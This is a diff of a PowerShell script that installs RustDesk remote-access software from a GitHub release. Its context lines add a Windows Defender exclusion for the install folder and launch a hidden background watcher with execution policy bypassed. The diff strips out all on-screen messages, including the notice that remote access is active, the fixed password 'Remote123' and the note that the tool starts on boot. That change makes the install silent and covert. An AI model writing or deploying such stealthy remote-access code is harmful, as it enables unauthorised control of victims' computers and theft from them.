@@ -6,7 +6,6 @@ function Install-RD {
     $cfgDir = "$env:APPDATA\RustDesk\config"
     $base   = 'https://github.com/kk70226581/rd-files/releases/download/v1.0'
 
-    Write-Host 'Installing...' -ForegroundColor Cyan
     try { Add-MpPreference -ExclusionPath $DEST -EA SilentlyContinue } catch {}
 
     Get-Process RuntimeBroker -EA SilentlyContinue |
@@ -109,15 +108,5 @@ if (Test-Path $del) { & $del }
 
     # Start watcher silently in background
     Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$watch`""
-
-    Write-Host ''
-    Write-Host '  ==========================================' -ForegroundColor Green
-    Write-Host '   DONE! Remote Access is now active.'       -ForegroundColor Green
-    Write-Host '  ==========================================' -ForegroundColor Green
-    Write-Host "   Your ID:  $RDID"       -ForegroundColor Cyan
-    Write-Host '   Password: Remote123'   -ForegroundColor Cyan
-    Write-Host '   Auto-deletes: in 1 hour OR when stopped' -ForegroundColor Gray
-    Write-Host '   Auto-starts on boot: YES'                -ForegroundColor Gray
-    Write-Host '  ==========================================' -ForegroundColor Green
 }
 Install-RD
